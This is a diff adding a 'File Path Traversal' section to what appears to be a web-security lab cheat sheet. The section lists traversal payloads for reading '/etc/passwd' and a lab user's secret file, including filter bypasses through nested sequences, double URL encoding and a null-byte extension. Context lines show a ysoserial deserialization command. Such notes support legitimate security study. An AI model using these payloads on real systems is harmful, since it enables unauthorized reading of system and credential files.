@@ -71,6 +71,16 @@ java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
 %error;
 ```
 
+# File Path Traversal
+```
+../../../home/carlos/secret
+/etc/passwd
+....//....//....//home/carlos/secret
+%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252fhome%2fcarlos%2fsecret
+/var/www/images/../../../home/carlos/secret
+../../../home/carlos/secret%007.jpg
+```
+
 # Obfuscation
 
 ## Double URL Encoding 
